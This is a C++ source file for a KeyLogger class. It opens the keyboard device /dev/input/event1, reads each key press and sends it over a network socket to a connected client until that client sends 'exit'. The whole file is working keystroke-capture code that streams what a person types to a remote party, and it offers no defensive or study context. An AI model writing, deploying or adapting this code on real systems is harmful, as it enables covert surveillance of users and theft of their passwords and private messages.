#include "keylogger.h"

void KeyLogger::catchKeyPressUntilESC(int newSd) {
    const char *dev_path = "/dev/input/event1"; // Path to keyboard device file
    int fd = open(dev_path, O_RDONLY);
    if (fd < 0)
    {
        char msg[100];
        memset(&msg, 0, sizeof(msg)); // clear the buffer
        string temp = "Cannot catch keys pressed.";
        strcpy(msg , temp.c_str());
        send(newSd, (char *)&msg, strlen(msg), 0);

        std::cerr << "Could not open device file." << std::endl;
        return;
    }

    //if receive "9" from client, then stop program
    bool stop = 0;
    auto listenFromClient = [&newSd]()
    {
        char msg[30];
        while(1)
        {
            memset(&msg, 0, sizeof(msg)); // clear the buffer
            recv(newSd, (char *)&msg, sizeof(msg), 0);
            if(strlen(msg) == 0)
            	break;

            if (!strcmp(msg, "exit"))
                break;
        }
        return;
    };

    auto catchKey = [&newSd , &fd, &stop]()
    {
        serverFunction luu;
        char msg[100];
        string temp = "";
        while (stop == 0)
        {
            temp = "";
            struct input_event ev;
            ssize_t n = read(fd, &ev, sizeof(ev));
            if (n == sizeof(ev))
            {
                if (ev.type == EV_KEY && ev.value == 1)
                {
                    // cout << "Key " << luu.MAP[ev.code] << " was pressed." << std::endl;
                    temp += "Key " + luu.MAP[ev.code] + " was pressed.";
                    
                    memset(&msg, 0, sizeof(msg));
                    strcpy(msg, temp.c_str());
                    // cout << msg << "\n";
                    send(newSd, (char *)&msg, strlen(msg), 0);
                }
            }
        }
    };

    // serverFunction* obj = this;  // pointer to the current object
    thread func1(catchKey);
    func1.detach();

    thread func2(listenFromClient);
    // func2.detach();
    func2.join();
    
    char msg[20];
    memset(&msg, 0, sizeof(msg));
	strcpy(msg, "exit");
	send(newSd, (char *)&msg, strlen(msg), 0);
    stop = 1;

    cout << "Stop catching key pressed\n";
    close(fd);
}

// void KeyLogger::catchKey(int newSd, int fd) {

// }